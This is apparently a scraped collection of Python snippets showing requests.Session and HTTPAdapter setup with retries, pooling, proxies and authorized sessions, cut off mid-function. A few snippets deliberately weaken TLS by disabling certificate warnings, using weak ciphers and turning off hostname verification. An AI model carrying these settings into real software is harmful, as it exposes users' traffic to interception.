        requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
        requests.packages.urllib3.disable_warnings(SNIMissingWarning)
        if not self.pOptions.verify_ssl:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

        self.adapter = requests.adapters.HTTPAdapter(
                pool_connections = 1,
                max_retries = self.pOptions.max_retries)
        self.session = requests.Session()
        self.session.auth = None
        if self.pOptions.authentication == AuthenticationType.Basic:
            self.session.auth = requests.auth.HTTPBasicAuth(self.creds.username,
                                                    self.creds.password)
        self.session.headers.update(self.headers)
        self.session.mount("https", self.adapter)
        self._logger.debug("Connection to device: complete")
        return True 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        # Rewrite of the
        # requests.adapters.HTTPAdapter.init_poolmanager method
        # to use WeakCiphersPoolManager instead of
        # urllib3's PoolManager
        self._pool_connections = connections
        self._pool_maxsize = maxsize
        self._pool_block = block

        self.poolmanager = WeakCiphersPoolManager(num_pools=connections,
                                                  maxsize=maxsize, block=block, strict=True, **pool_kwargs) 
**************************************
def init_poolmanager(
            self, connections, maxsize,
            block=requests.adapters.DEFAULT_POOLBLOCK, **pool_kwargs):
        """see requests.adapters.HTTPAdapter.init_poolmanager"""
        # Disable hostname verification
        pool_kwargs['assert_hostname'] = False

        # Call
        HTTPAdapter.init_poolmanager(
            self, connections=connections, maxsize=maxsize, block=block,
            **pool_kwargs) 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def __init__(self, api_key=None, proxy_dict=None, env=None, json_encoder=None, adapter=None):
        if api_key:
            self._FCM_API_KEY = api_key
        elif os.getenv('FCM_API_KEY', None):
            self._FCM_API_KEY = os.getenv('FCM_API_KEY', None)
        else:
            raise AuthenticationError("Please provide the api_key in the google-services.json file")

        self.FCM_REQ_PROXIES = None
        self.requests_session = requests.Session()
        retries = Retry(backoff_factor=1, status_forcelist=[502, 503],
                        method_whitelist=(Retry.DEFAULT_METHOD_WHITELIST | frozenset(['POST'])))
        self.requests_session.mount('http://', adapter or HTTPAdapter(max_retries=retries))
        self.requests_session.mount('https://', adapter or HTTPAdapter(max_retries=retries))
        self.requests_session.headers.update(self.request_headers())
        self.requests_session.mount(self.INFO_END_POINT, HTTPAdapter(max_retries=self.INFO_RETRIES))

        if proxy_dict and isinstance(proxy_dict, dict) and (('http' in proxy_dict) or ('https' in proxy_dict)):
            self.FCM_REQ_PROXIES = proxy_dict
            self.requests_session.proxies.update(proxy_dict)
        self.send_request_responses = []

        if env == 'app_engine':
            try:
                from requests_toolbelt.adapters import appengine
                appengine.monkeypatch()
            except ModuleNotFoundError:
                pass

        self.json_encoder = json_encoder 
**************************************
def test_transport_adapter_ordering(self):
        s = requests.Session()
        order = ['https://', 'http://']
        assert order == list(s.adapters)
        s.mount('http://git', HTTPAdapter())
        s.mount('http://github', HTTPAdapter())
        s.mount('http://github.com', HTTPAdapter())
        s.mount('http://github.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://github.com',
            'http://github',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s.mount('http://gittip', HTTPAdapter())
        s.mount('http://gittip.com', HTTPAdapter())
        s.mount('http://gittip.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://gittip.com/about/',
            'http://github.com',
            'http://gittip.com',
            'http://github',
            'http://gittip',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s2 = requests.Session()
        s2.adapters = {'http://': HTTPAdapter()}
        s2.mount('https://', HTTPAdapter())
        assert 'http://' in s2.adapters
        assert 'https://' in s2.adapters 
**************************************
def test_session_close_proxy_clear(self, mocker):
        proxies = {
          'one': mocker.Mock(),
          'two': mocker.Mock(),
        }
        session = requests.Session()
        mocker.patch.dict(session.adapters['http://'].proxy_manager, proxies)
        session.close()
        proxies['one'].clear.assert_called_once_with()
        proxies['two'].clear.assert_called_once_with() 
**************************************
def test_transport_adapter_ordering(self):
        s = requests.Session()
        order = ['https://', 'http://']
        assert order == list(s.adapters)
        s.mount('http://git', HTTPAdapter())
        s.mount('http://github', HTTPAdapter())
        s.mount('http://github.com', HTTPAdapter())
        s.mount('http://github.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://github.com',
            'http://github',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s.mount('http://gittip', HTTPAdapter())
        s.mount('http://gittip.com', HTTPAdapter())
        s.mount('http://gittip.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://gittip.com/about/',
            'http://github.com',
            'http://gittip.com',
            'http://github',
            'http://gittip',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s2 = requests.Session()
        s2.adapters = {'http://': HTTPAdapter()}
        s2.mount('https://', HTTPAdapter())
        assert 'http://' in s2.adapters
        assert 'https://' in s2.adapters 
**************************************
def test_session_close_proxy_clear(self, mocker):
        proxies = {
          'one': mocker.Mock(),
          'two': mocker.Mock(),
        }
        session = requests.Session()
        mocker.patch.dict(session.adapters['http://'].proxy_manager, proxies)
        session.close()
        proxies['one'].clear.assert_called_once_with()
        proxies['two'].clear.assert_called_once_with() 
**************************************
def get_room_info(url):
    s = requests.Session()
    s.mount("http://", requests.adapters.HTTPAdapter(max_retries=MAX_RETRIES))
    r = s.get(url, headers=headers, timeout=TIMEOUT)
    if r is None:
        return None
    soup = bs4.BeautifulSoup(r.content, "lxml")
    # logger.debug(soup.prettify())
    room = []

    hide_info = soup.find("div", class_="hide")
    room_id = hide_info.find("input", id="room_id")["value"]
    house_id = hide_info.find("input", id="house_id")["value"]
    room.append(("url", url))
    room.append(("room_id", room_id))
    room.append(("house_id", house_id))

    outer = soup.select("body > div.area.clearfix")
    if len(outer) != 1:
        return None
    outer = outer[0]

    right = outer.find("div", class_="room_detail_right")
    details = [detail.get_text(strip=True) for detail in right.find("ul", class_="detail_room").find_all("li")]
    details = [" ".join(detail.replace("\n", " ").split()) for detail in details]
    room.append(("名称", right.find("div", class_="room_name").h2.get_text(strip=True)))
    for detail in details:
        room.append(tuple(map(lambda x: x.strip(), detail.split("："))))

    detail_json_r = s.get("http://sz.ziroom.com/detail/info?id={}&house_id={}".format(room_id, house_id),
                          headers=headers, timeout=10)
    if detail_json_r is not None:
        detail_json = detail_json_r.json()
        room.append((detail_json["data"]["air_part"]["vanancy"]["promise"].strip(),
                     "{}，{}".format(detail_json["data"]["air_part"]["vanancy"]["vanancy_day"],
                                    detail_json["data"]["air_part"]["vanancy"]["status"])))
        room.append(tuple(
            map(lambda x: x.strip(), detail_json["data"]["air_part"]["air_quality"]["show_info"]["status"].split(":"))))

    logger.debug(room)
    return room 
**************************************
def test_transport_adapter_ordering(self):
        s = requests.Session()
        order = ['https://', 'http://']
        assert order == list(s.adapters)
        s.mount('http://git', HTTPAdapter())
        s.mount('http://github', HTTPAdapter())
        s.mount('http://github.com', HTTPAdapter())
        s.mount('http://github.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://github.com',
            'http://github',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s.mount('http://gittip', HTTPAdapter())
        s.mount('http://gittip.com', HTTPAdapter())
        s.mount('http://gittip.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://gittip.com/about/',
            'http://github.com',
            'http://gittip.com',
            'http://github',
            'http://gittip',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s2 = requests.Session()
        s2.adapters = {'http://': HTTPAdapter()}
        s2.mount('https://', HTTPAdapter())
        assert 'http://' in s2.adapters
        assert 'https://' in s2.adapters 
**************************************
def __init__(
        self,
        credentials,
        refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
        max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
        refresh_timeout=None,
        auth_request=None,
    ):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def set_retry_on_busy(self, total=5, backoff_factor=0.1, status_forcelist=None, **kwargs):
        """
        Mount a custom retry object on the current session that allows service level
        retries when the SMC might reply with a Service Unavailable (503) message.
        This can be possible in larger environments with higher database activity.
        You can all this on the existing session, or provide as a dict to the login
        constructor.
        
        :param int total: total retries
        :param float backoff_factor: when to retry
        :param list status_forcelist: list of HTTP error codes to retry on
        :param list method_whitelist: list of methods to apply retries for, GET, POST and
            PUT by default
        :return: None
        """
        if self.session:
            from requests.adapters import HTTPAdapter
            from requests.packages.urllib3.util.retry import Retry
    
            method_whitelist = kwargs.pop('method_whitelist', []) or ['GET', 'POST', 'PUT']
            status_forcelist = frozenset(status_forcelist) if status_forcelist else frozenset([503])
            retry = Retry(
                total=total,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
                method_whitelist=method_whitelist)
            
            for proto_str in ('http://', 'https://'):
                self.session.mount(proto_str, HTTPAdapter(max_retries=retry))
            logger.debug('Mounting retry object to HTTP session: %s' % retry) 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def requests_retry_session(
    retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)
):
    """Opinionated wrapper that creates a requests session with a
    HTTPAdapter that sets up a Retry policy that includes connection
    retries.

    If you do the more naive retry by simply setting a number. E.g.::

        adapter = HTTPAdapter(max_retries=3)

    then it will raise immediately on any connection errors.
    Retrying on connection errors guards better on unpredictable networks.
    From http://docs.python-requests.org/en/master/api/?highlight=retries#requests.adapters.HTTPAdapter
    it says: "By default, Requests does not retry failed connections."

    The backoff_factor is documented here:
    https://urllib3.readthedocs.io/en/latest/reference/urllib3.util.html#urllib3.util.retry.Retry
    A default of retries=3 and backoff_factor=0.3 means it will sleep like::

        [0.3, 0.6, 1.2]
    """  # noqa
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def test_transport_adapter_ordering(self):
        s = requests.Session()
        order = ['https://', 'http://']
        assert order == list(s.adapters)
        s.mount('http://git', HTTPAdapter())
        s.mount('http://github', HTTPAdapter())
        s.mount('http://github.com', HTTPAdapter())
        s.mount('http://github.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://github.com',
            'http://github',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s.mount('http://gittip', HTTPAdapter())
        s.mount('http://gittip.com', HTTPAdapter())
        s.mount('http://gittip.com/about/', HTTPAdapter())
        order = [
            'http://github.com/about/',
            'http://gittip.com/about/',
            'http://github.com',
            'http://gittip.com',
            'http://github',
            'http://gittip',
            'http://git',
            'https://',
            'http://',
        ]
        assert order == list(s.adapters)
        s2 = requests.Session()
        s2.adapters = {'http://': HTTPAdapter()}
        s2.mount('https://', HTTPAdapter())
        assert 'http://' in s2.adapters
        assert 'https://' in s2.adapters 
**************************************
def __init__(self):
        super().__init__()
        self.session = requests.Session()
        a = requests.adapters.HTTPAdapter(max_retries=10)
        self.session.mount('http://', a) 
**************************************
def __init__(self):
        super().__init__()

        self.session = requests.Session()
        a = requests.adapters.HTTPAdapter(max_retries=10)
        self.session.mount('http://', a) 
**************************************
def __init__(self):
        super().__init__()

        self.session = requests.Session()
        a = requests.adapters.HTTPAdapter(max_retries=10)
        self.session.mount('http://', a) 
**************************************
def __init__(self):
        super().__init__()
        self.session = requests.Session()
        a = requests.adapters.HTTPAdapter(
            max_retries=Retry(method_whitelist=frozenset(['GET', 'POST']))
        )
        self.session.mount('http://', a) 
**************************************
def set_retry_on_busy(self, total=5, backoff_factor=0.1, status_forcelist=None, **kwargs):
        """
        Mount a custom retry object on the current session that allows service level
        retries when the SMC might reply with a Service Unavailable (503) message.
        This can be possible in larger environments with higher database activity.
        You can all this on the existing session, or provide as a dict to the login
        constructor.
        
        :param int total: total retries
        :param float backoff_factor: when to retry
        :param list status_forcelist: list of HTTP error codes to retry on
        :param list method_whitelist: list of methods to apply retries for, GET, POST and
            PUT by default
        :return: None
        """
        if self.session:
            from requests.adapters import HTTPAdapter
            from requests.packages.urllib3.util.retry import Retry
    
            method_whitelist = kwargs.pop('method_whitelist', []) or ['GET', 'POST', 'PUT']
            status_forcelist = frozenset(status_forcelist) if status_forcelist else frozenset([503])
            retry = Retry(
                total=total,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
                method_whitelist=method_whitelist)
            
            for proto_str in ('http://', 'https://'):
                self.session.mount(proto_str, HTTPAdapter(max_retries=retry))
            logger.debug('Mounting retry object to HTTP session: %s' % retry) 
**************************************
def requests_with_retry(retries: int = 3) -> requests.Session:
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        max_retries=retry.Retry(
            total=retries, backoff_factor=0.1, status_forcelist=(500, 502, 504)
        )
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session 
**************************************
def __init__(self, domain: str, api_version: str = API_VERSION, application: str = DEFAULT_APPLICATION, verify=True,
                 http_adapter: requests.adapters.HTTPAdapter = None):
        super().__init__()
        self._session = None
        self.domain = domain
        self.api_version = api_version
        self.application = application
        self.verify = verify
        self.http_adapter = http_adapter 
**************************************
def use(
            cls,
            environment_or_domain: Union[Environment, str] = Environment.PROD,
            client_id: Optional[str] = None,
            client_secret: Optional[str] = None,
            scopes: Optional[Union[Tuple, List, str]] = (),
            api_version: str = API_VERSION,
            application: str = DEFAULT_APPLICATION,
            http_adapter: requests.adapters.HTTPAdapter = None
    ) -> None:
        environment_or_domain = environment_or_domain.name if isinstance(environment_or_domain,
                                                                         Environment) else environment_or_domain
        session = cls.get(
            environment_or_domain,
            client_id=client_id,
            client_secret=client_secret,
            scopes=scopes,
            api_version=api_version,
            application=application,
            http_adapter=http_adapter
        )

        session.init()

        if cls.current_is_set:
            cls.current = session
        else:
            cls.default = session 
**************************************
def get(
            cls,
            environment_or_domain: Union[Environment, str] = Environment.PROD,
            client_id: Optional[str] = None,
            client_secret: Optional[str] = None,
            scopes: Optional[Union[Tuple, List, str]] = (),
            token: str = '',
            is_gssso: bool = False,
            api_version: str = API_VERSION,
            application: str = DEFAULT_APPLICATION,
            http_adapter: requests.adapters.HTTPAdapter = None
    ) -> 'GsSession':
        """ Return an instance of the appropriate session type for the given credentials"""

        environment_or_domain = environment_or_domain.name if isinstance(environment_or_domain,
                                                                         Environment) else environment_or_domain

        if client_id is not None:
            if environment_or_domain not in (Environment.PROD.name, Environment.QA.name, Environment.DEV.name):
                raise MqUninitialisedError('Only PROD, QA and DEV are valid environments')
            if isinstance(scopes, str):
                scopes = (scopes,)
            else:
                scopes = cls.Scopes.get_default() if len(scopes) == 0 else scopes
            return OAuth2Session(environment_or_domain, client_id, client_secret, scopes, api_version=api_version,
                                 application=application, http_adapter=http_adapter)
        elif token:
            if is_gssso:
                try:
                    return PassThroughGSSSOSession(environment_or_domain, token, api_version=api_version,
                                                   application=application, http_adapter=http_adapter)
                except NameError:
                    raise MqUninitialisedError('This option requires gs_quant_internal to be installed')
            else:
                return PassThroughSession(environment_or_domain, token, api_version=api_version,
                                          application=application, http_adapter=http_adapter)
        else:
            try:
                return KerberosSession(environment_or_domain, api_version=api_version, http_adapter=http_adapter)
            except NameError:
                raise MqUninitialisedError('Must specify client_id and client_secret') 
**************************************
def __init__(self, environment_or_domain: str, api_version: str = API_VERSION,
                     application: str = DEFAULT_APPLICATION, http_adapter: requests.adapters.HTTPAdapter = None):
            domain, verify = self.domain_and_verify(environment_or_domain)
            GsSession.__init__(self, domain, api_version=api_version, application=application, verify=verify,
                               http_adapter=http_adapter) 
**************************************
def __init__(self, url=None,
                 base_url=None,
                 proxy=None,
                 username=None,
                 password=None,
                 verify=False,
                 minutes=3,
                 timeout=30):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        OpTestLogger.optest_logger_glob.setUpChildLogger("urllib3")
        self.username = username
        self.password = password
        self.session = requests.Session()
        if self.username is not None and self.password is not None:
            self.session.auth = (self.username, self.password)
        self.session.verify = verify
        self.jsonHeader = {'Content-Type': 'application/json'}
        self.xAuthHeader = {}
        self.timeout = timeout
        self.minutes = minutes
        self.session.mount('https://', HTTPAdapter(max_retries=5))
        # value.max_retries for future debug if needed
#        for key, value in self.session.adapters.items():
#            log.debug("max_retries={}".format(value.max_retries))

        if proxy:
            self.session.proxies = {"http": proxy}
        else:
            self.session.proxies = {}

        self.base_url = url + (base_url if base_url else "") 
**************************************
def get_default_session():
    s = requests.Session()
    # remount http and https adapters to config max_retries
    adapter = HTTPAdapter(
        max_retries=0,
        pool_connections=5,
        pool_maxsize=50,
        pool_block=True,
    )
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    return s 
**************************************
def session(self):
        if not self._session:
            session = requests.session()
            session.mount(self.config.api_url, requests.adapters.HTTPAdapter(max_retries=3))
            self._session = session
        return self._session 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 auth_request=None):
        super(AuthorizedSession, self).__init__()
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        if auth_request is None:
            auth_request_session = requests.Session()

            # Using an adapter to make HTTP requests robust to network errors.
            # This adapter retrys HTTP requests when network errors occur
            # and the requests seems safely retryable.
            retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
            auth_request_session.mount("https://", retry_adapter)

            # Do not pass `self` as the session here, as it can lead to
            # infinite recursion.
            auth_request = Request(auth_request_session)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        self._auth_request = auth_request 
**************************************
def _download(url, outfile, headers, transient_retry, strip_prefix):
  s = requests.Session()
  retry = None
  if transient_retry > 0:
    # See http://urllib3.readthedocs.io/en/latest/reference/urllib3.util.html
    retry = Retry(
      total=transient_retry,
      connect=5,
      read=5,
      redirect=5,
      status_forcelist=range(500, 600),
      backoff_factor=0.2,
      raise_on_status=False,
    )
    print retry
    s.mount(url, requests.adapters.HTTPAdapter(max_retries=retry))


  logging.info('Connecting to %s ...', url)
  r = s.get(url, headers=headers, stream=True)
  if r.status_code != requests.codes.ok:
    r.raise_for_status()

  if outfile:
    fd = open(outfile, 'wb')
  else:
    fd = sys.stdout

  total = 0
  with fd:
    logging.info('Downloading %s ...', url)
    loaded_prefix = ''
    for chunk in r.iter_content(CHUNK_SIZE):
      total += len(chunk)

      if strip_prefix:
        remaining_prefix = strip_prefix[len(loaded_prefix):]
        round_prefix = chunk[:len(remaining_prefix)]
        loaded_prefix += round_prefix
        if round_prefix != remaining_prefix[:len(round_prefix)]:
          raise ValueError(
              'Expected prefix was not observed: %r != %r...' % (
              loaded_prefix, strip_prefix))
        chunk = chunk[len(round_prefix):]
        if not chunk:
          continue

      fd.write(chunk)
      logging.info('Downloaded %.1f MB so far', total / 1024 / 1024)
  return r.status_code, total 
**************************************
def __init__(self, access_key=None, secret_key=None, https_proxy=None,
                 insecure=False, endpoint=None, search_endpoint=None):
        """Initializes a new API connection.

        Args:
            access_key (str, optitonal): The user's Matchlight Public
                API access key. If not passed as an argument this value
                must be set using the ``MATCHLIGHT_ACCESS_KEY``
                environment variable.
            secret_key (str, optional): The user's Matchlight Public
                API access key. If not passed as an argument this value
                must be set using the ``MATCHLIGHT_SECRET_KEY``
                environment variable.
            https_proxy (str): A string defining the HTTPS proxy to
                use. Defaults to None.
            insecure (bool, optional): Whether or not to verify
                certificates for the HTTPS proxy. Defaults to ``False``
                (certificates will be verified).
            endpoint (str, optional): Base URL for requests. Defaults
                to ``'https://api.matchlig.ht/api/v2'``.
            search_endpoint (str, optional): Base URL for all search
                API requests.

        """
        if access_key is None:
            access_key = os.environ.get('MATCHLIGHT_ACCESS_KEY', None)
        if secret_key is None:
            secret_key = os.environ.get('MATCHLIGHT_SECRET_KEY', None)
        if access_key is None or secret_key is None:
            raise matchlight.error.SDKError(
                'The APIConnection object requires your Matchlight '
                'API access_key and secret_key either be passed as input '
                'parameters or set in the MATCHLIGHT_ACCESS_KEY and '
                'MATCHLIGHT_SECRET_KEY environment variables.')
        if endpoint is None:
            endpoint = MATCHLIGHT_API_URL_V2
        if search_endpoint is None:
            search_endpoint = MATCHLIGHT_API_URL_V2

        self.access_key = access_key
        self.secret_key = secret_key
        self.proxy = {'https': https_proxy}
        self.insecure = insecure
        self.endpoint = endpoint
        self.search_endpoint = search_endpoint
        self.session = requests.Session()
        self.session.mount(
            self.endpoint,
            requests.adapters.HTTPAdapter(
                max_retries=requests_urllib3.util.Retry(
                    total=5, status_forcelist=[500, 502, 503, 504])),
        ) 

Python requests.org() Examples

**************************************
def _query(
            self,
            page: 'WikipediaPage',
            params: Dict[str, Any]
    ):
        base_url = 'https://' + page.language + '.wikipedia.org/w/api.php'
        log.info(
            "Request URL: %s",
            base_url + "?" + "&".join(
                [k + "=" + str(v) for k, v in params.items()]
            )
        )
        params['format'] = 'json'
        params['redirects'] = 1
        r = self._session.get(
            base_url,
            params=params,
            **self._request_kwargs
        )
        return r.json() 
**************************************
def rest_tb_file_dnload_to_fd(self, fd, remote_filename):
        """
        Download a remote file from the broker to a local file

        :param str remote_filename: filename in the broker's user
          storage area
        :params int fd: file descriptor where to write the data to
        """
        url = "files/%s" % remote_filename
        with contextlib.closing(self.send_request("GET", url, data = {},
                                                  stream = True,
                                                  raw = True)) as r:
            # http://docs.python-requests.org/en/master/user/quickstart/#response-content
            chunk_size = 1024
            total = 0
            for chunk in r.iter_content(chunk_size):
                os.write(fd, chunk)
                total += len(chunk)
            return total 
**************************************
def rest_tb_target_console_read_to_fd(self, fd, rt, console, offset,
                                          max_size = 0, ticket = ''):
        url = "targets/%s/console/" % rt['id']
        data = {
            'offset': offset,
        }
        if console:
            data['console'] = console
        if ticket != '':
            data['ticket'] = ticket
        with contextlib.closing(self.send_request("GET", url, data = data,
                                                  stream = True,
                                                  raw = True)) as r:
            # http://docs.python-requests.org/en/master/user/quickstart/#response-content
            chunk_size = 1024
            total = 0
            for chunk in r.iter_content(chunk_size):
